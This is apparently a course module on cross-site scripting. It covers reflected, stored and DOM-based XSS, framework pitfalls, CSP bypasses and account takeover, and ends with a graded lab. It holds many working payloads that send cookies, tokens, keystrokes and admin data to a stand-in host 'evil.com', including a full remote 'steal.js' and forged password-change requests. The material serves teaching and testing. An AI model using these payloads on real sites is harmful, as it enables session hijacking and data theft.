# Module 3 — Cross-Site Scripting (XSS)

Cross-Site Scripting is the vulnerability class where an attacker injects malicious JavaScript into a page that other users view. The browser trusts the script because it comes from the legitimate origin. XSS is not a single bug — it is a family of vulnerabilities that differ in how the payload is delivered, where it executes, and what defenses must be bypassed. The impact ranges from session hijacking to full account takeover, depending on what cookies and tokens the application stores and what actions the injected script can perform.

XSS is consistently ranked in the top five of the OWASP Top 10 because it is easy to find in modern web applications, easy to exploit with minimal technical skill, and has high impact when combined with other vulnerabilities. Understanding XSS requires understanding how browsers parse HTML, how JavaScript executes in different contexts, and how security mechanisms like CSP and HttpOnly cookies provide partial but not complete protection.

## Reflected XSS

Reflected XSS occurs when user input is included in the server's response without proper encoding. The input is not stored — it is reflected back immediately. A search function is the classic example:

```
https://app.example.com/search?q=<script>alert(1)</script>
```

If the server includes the search term directly in the HTML response:

```html
<h2>Search results for: <script>alert(1)</script></h2>
```

The browser executes the script because it encounters a `<script>` tag in the HTML. The alert dialog proves the vulnerability exists, but real attacks use payloads that steal cookies, redirect to phishing pages, or perform actions on behalf of the user.

Reflected XSS payloads vary based on the HTML context where the input lands. If the input is inside a tag attribute:

```html
<input type="text" value="USER_INPUT">
```

The attacker closes the attribute and tag:

```
"><script>alert(1)</script>
```

This produces:

```html
<input type="text" value=""><script>alert(1)</script>">
```

If the input is inside a JavaScript block:

```html
<script>var search = 'USER_INPUT';</script>
```

The attacker breaks out of the JavaScript string:

```
';alert(1);//
```

This produces:

```html
<script>var search = '';alert(1);//';</script>
```

If the input is in a URL within an attribute:

```html
<a href="USER_INPUT">Click here</a>
```

The attacker uses the javascript: protocol:

```
javascript:alert(1)
```

Or for a more realistic attack:

```
javascript:document.location='https://evil.com/steal?c='+document.cookie
```

The payload construction is context-dependent. There is no universal XSS payload that works everywhere. A skilled tester identifies the context, studies the surrounding syntax, and crafts a payload that cleanly breaks out of that context.

Different encoding contexts require different payloads:

- **HTML body**: `<script>alert(1)</script>` — raw HTML tags work directly.
- **HTML attribute**: `"><script>alert(1)</script>` — close the attribute and tag.
- **JavaScript string**: `';alert(1);//` — close the string and inject code.
- **URL attribute**: `javascript:alert(1)` — use the javascript protocol.
- **CSS**: `expression(alert(1))` — for legacy IE (not recommended).
- **Comment**: `--><script>alert(1)</script>` — break out of HTML comments.

## Stored XSS

Stored XSS occurs when the malicious script is saved by the application (in a database, file, or other persistent storage) and later served to other users. This is more dangerous than reflected XSS because the payload executes automatically when any user views the affected page — no social engineering required to deliver the URL.

Common locations for stored XSS:

- **Comment fields**: A forum post containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` executes for every user who views the post.
- **Profile fields**: A username, bio, or status message that is not properly encoded when displayed. The payload executes on every page that shows the user's profile.
- **Message systems**: A private message containing XSS executes when the recipient opens it.
- **Admin panels**: If a lower-privilege user can inject XSS that an admin views, the attacker can hijack the admin's session and escalate privileges.
- **File upload metadata**: File names, descriptions, and tags that are displayed without encoding.
- **Forum posts and wikis**: Any collaborative content that stores and renders HTML.
- **Order notes and support tickets**: Internal notes fields that are displayed in admin dashboards.

The stored XSS attack chain typically works like this:

1. The attacker identifies an input that is stored and displayed to other users.
2. They inject a payload that steals the victim's session cookie: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
3. The victim views the page containing the payload. The browser executes the script, sending the cookie to the attacker's server.
4. The attacker uses the stolen session cookie to impersonate the victim.

A more sophisticated stored XSS targets specific users. Instead of stealing cookies (which HttpOnly flags can prevent), the payload performs actions in the context of the logged-in user:

```javascript
fetch('/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 10000})
});
```

If the application uses CSRF tokens in custom headers or meta tags, the XSS payload can read them (XSS bypasses the Same-Origin Policy) and include them in the forged request.

Stored XSS can also be used for keylogging. The injected script captures every keystroke the victim types and sends it to the attacker:

```javascript
document.addEventListener('keypress', function(e) {
    fetch('https://evil.com/log?key=' + encodeURIComponent(e.key));
});
```

This captures passwords, credit card numbers, private messages, and any other text the victim types on the page.

## DOM-Based XSS

DOM-based XSS occurs entirely in the client-side code. The server's response is safe — the vulnerability exists in how JavaScript processes the data after it arrives in the browser.

The most dangerous sink functions in JavaScript are:

- `document.write()` / `document.writeln()`
- `element.innerHTML` / `element.outerHTML`
- `element.src`
- `eval()`
- `setTimeout()` / `setInterval()` with string arguments
- `new Function()` with string arguments
- `$.html()` (jQuery)
- `element.insertAdjacentHTML()`

The source of untrusted data includes:

- `document.URL`
- `document.documentURI`
- `location.href` / `location.search` / `location.hash`
- `window.name`
- `document.referrer`
- `postMessage` data
- `URLSearchParams`

A typical DOM-based XSS:

```javascript
var params = new URLSearchParams(window.location.search);
var name = params.get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name + '!';
```

If the URL contains `?name=<img src=x onerror=alert(1)>`, the browser parses this as HTML when setting innerHTML, and the onerror handler executes.

The fix is to use `textContent` instead of `innerHTML`, or to sanitize the input before inserting it into the DOM:

```javascript
var name = params.get('name');
var safeName = document.createTextNode(name);
document.getElementById('greeting').appendChild(safeName);
```

`textContent` does not parse HTML — it treats the string as plain text. `createTextNode` achieves the same effect.

More complex DOM-based XSS involves chains of sinks and sources. The data might pass through multiple functions, be transformed, and eventually reach a dangerous sink. Static analysis tools struggle to track these flows because the data can cross function boundaries, be stored in objects, and be modified along the way.

DOM XSS via `document.write` is particularly dangerous because it replaces the entire document context:

```javascript
var page = document.location.hash.substring(1);
document.write('<html><body>' + page + '</body></html>');
```

The hash fragment is written directly into the page, replacing everything including the script that performs the write.

## XSS in Modern Frameworks

Modern JavaScript frameworks provide varying levels of built-in XSS protection, but none are immune.

**React**: React escapes values rendered in JSX by default. `<div>{userInput}</div>` is safe because React escapes HTML entities. But React has dangerous escape hatches:

```jsx
// SAFE - React escapes this
<div>{userInput}</div>

// DANGEROUS - dangerouslySetInnerHTML bypasses escaping
<div dangerouslySetInnerHTML={{__html: userInput}} />

// DANGEROUS - React rendering with URL protocol
<a href={userInput}>Click</a>
// If userInput is javascript:alert(1), React will create a javascript: link
```

React warns about `javascript:` URLs in the console but still creates the link. An attacker-controlled URL in an href attribute can execute JavaScript.

**Angular**: Angular's template binding uses double curly braces `{{expression}}` which auto-escapes. But `bypassSecurityTrustAsHTML()` and similar methods disable the sanitizer:

```typescript
// SAFE
<div>{{userInput}}</div>

// DANGEROUS
<div [innerHTML]="userInput"></div>
// Angular sanitizes this, but bypassSecurityTrustAsHTML() disables sanitization
```

Angular's DomSanitizer provides bypass methods that developers sometimes use incorrectly, trusting user input that should be sanitized.

**Vue**: Vue escapes content in double curly braces and `v-text`. But `v-html` renders raw HTML:

```html
<!-- SAFE -->
<div>{{userInput}}</div>
<div v-text="userInput"></div>

<!-- DANGEROUS -->
<div v-html="userInput"></div>
```

Vue also has the `static` modifier on `v-bind` which evaluates the expression once and does not track reactivity. If an attacker can influence the static expression, they can inject code.

**Server-Side Rendering (SSR)**: Frameworks like Next.js, Nuxt, and SvelteKit render pages on the server. XSS in SSR payloads (like `__NEXT_DATA__` or `__NUXT__` props) can execute during hydration on the client side. If the server injects user-controlled data into the initial HTML without proper encoding, the browser parses it as HTML before any framework-level protection takes effect.

## Content Security Policy Bypass

CSP is the primary defense against XSS, but bypasses are common. A weak CSP provides a false sense of security.

Common bypass techniques:

**JSONP endpoints on trusted domains**: If the CSP allows scripts from `trusted-domain.com` and that domain has a JSONP endpoint, the attacker can use it:

```
https://trusted-domain.com/api/data?callback=alert(1)//
```

The JSONP response wraps the callback in a script tag, executing the attacker's code.

**Open redirect on a trusted domain**: If `trusted-domain.com` has an open redirect to `evil.com`, and the CSP allows `trusted-domain.com`, the attacker can chain them:

```
https://trusted-domain.com/redirect?url=https://evil.com/payload.js
```

The script loads from the trusted domain but the redirect sends it to the attacker's server.

**Base URI injection**: If the CSP does not restrict `<base>` tags and the attacker can inject one, all relative URLs resolve to the attacker's domain:

```html
<base href="https://evil.com/">
```

**Angular template injection**: Angular's template compiler can execute arbitrary JavaScript even with CSP:

```
https://app.example.com/page?name={{constructor.constructor('alert(1)')()}}
```

This works because Angular's constructor chain bypasses CSP restrictions.

**CSS injection to exfiltrate data**: If `style-src` is not restricted, an attacker can use CSS selectors to read data:

```css
input[value^="a"] { background: url(https://evil.com/log?a); }
```

This tests whether the first character of a value is "a" and exfiltrates the result through a background image request.

A secure CSP configuration for a modern web application:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-RANDOM_VALUE';
  style-src 'self' 'nonce-RANDOM_VALUE';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
```

The nonce must be unique per request and cryptographically random. It allows specific inline scripts while blocking all others.

## XSS to Account Takeover

The most impactful XSS attack chains involve gaining control of a user's account. The attack varies based on what security mechanisms the application uses:

**Session cookie theft (no HttpOnly)**:

```javascript
fetch('https://evil.com/steal?cookie='+document.cookie)
```

The attacker receives the session cookie and sets it in their own browser to impersonate the victim. This is the simplest attack but requires the session cookie to lack the HttpOnly flag.

**Token theft from localStorage**:

```javascript
var token = localStorage.getItem('auth_token');
fetch('https://evil.com/steal?token='+token)
```

If the application stores JWT or API tokens in localStorage (which many single-page applications do), XSS can read them regardless of HttpOnly flags. This is why storing tokens in localStorage is a security risk.

**CSRF token extraction and forged requests**:

```javascript
var csrf = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/settings', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf
    },
    body: JSON.stringify({email: 'attacker@evil.com'})
});
```

XSS can read CSRF tokens from meta tags or form fields and include them in forged requests, bypassing CSRF protections.

**Webhook or OAuth token theft**:

```javascript
fetch('/api/user/tokens').then(r=>r.json()).then(data=>{
    fetch('https://evil.com/exfil?data='+btoa(JSON.stringify(data)))
});
```

If the application has API integrations with stored tokens, XSS can extract those tokens, giving the attacker access to third-party services.

**Password change hijack**:

```javascript
// When admin visits the page with XSS
fetch('/api/admin/users', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        username: 'admin',
        password: 'attacker-controlled'
    })
});
```

The attacker changes the admin's password through the application's own API, then logs in with the new password.

## Real Attack Chain: XSS → Session Hijack → Data Exfiltration

Consider a content management system with a blog comment feature. The comment form accepts a name, email, and message. The message is stored in the database and displayed on the blog post page without encoding (stored XSS).

**Step 1**: The attacker identifies the stored XSS. They post a comment containing:

```html
<img src=x onerror="
var script = document.createElement('script');
script.src = 'https://evil.com/steal.js';
document.head.appendChild(script);
">
```

**Step 2**: The attacker's `steal.js` file contains:

```javascript
(function(){
    var session = document.cookie;
    var csrf = '';
    var meta = document.querySelector('meta[name="csrf-token"]');
    if(meta) csrf = meta.content;
    
    fetch('/api/admin/posts?limit=500', {
        credentials: 'include'
    }).then(function(r){return r.json()}).then(function(posts){
        fetch('https://evil.com/exfil', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                cookie: session,
                csrf: csrf,
                posts: posts
            })
        });
    });
})();
```

**Step 3**: An administrator views the blog post to moderate comments. The browser executes the injected script. The script reads the admin's session cookie, extracts the CSRF token from the page, queries the admin API for all posts, and sends everything to the attacker's server.

**Step 4**: The attacker now has the admin's session cookie. They set it in their browser and access the admin panel. They also have the CSRF token for making authenticated requests. They can create, modify, or delete content, access user data, and maintain persistence by creating an admin account.

This chain demonstrates why XSS is consistently rated as a high-impact vulnerability. It is not just about showing an alert dialog — it is about what an attacker can do with the JavaScript context of a logged-in user's browser.

## Practical Exercise: XSS Attack Lab

Using a vulnerable web application with stored, reflected, and DOM-based XSS:

1. **Reflected XSS**: Find the search function. Test every parameter for reflected XSS. Try payloads in different contexts: inside HTML tags, inside attributes, inside JavaScript blocks, inside URLs. For each context, craft a payload that cleanly executes.

2. **Stored XSS**: Post a comment containing a JavaScript payload. Verify it executes when other users view the page. Extract the session cookie of a test user.

3. **DOM XSS**: Examine the client-side JavaScript. Identify any sink functions that use location-based sources. Craft a URL that triggers DOM-based XSS and demonstrate data exfiltration.

4. **Framework bypass**: If the application uses a framework (React, Angular, Vue), find the escape hatches (dangerouslySetInnerHTML, v-html, etc.) and demonstrate XSS through them.

5. **CSP analysis**: Examine the Content-Security-Policy header. Identify the directives and their values. Attempt bypass using JSONP, open redirects, or other techniques.

6. **Attack chain**: Combine XSS with another vulnerability. Options include: XSS to CSRF to privilege escalation, XSS to session hijack to admin panel access, XSS to data exfiltration through the application's own API.

Time limit: 75 minutes. Grading criteria: reflected XSS identification and exploitation (15%), stored XSS with impact demonstration (25%), DOM-based XSS (15%), CSP bypass attempt (15%), complete attack chain (20%), documentation and evidence (10%).
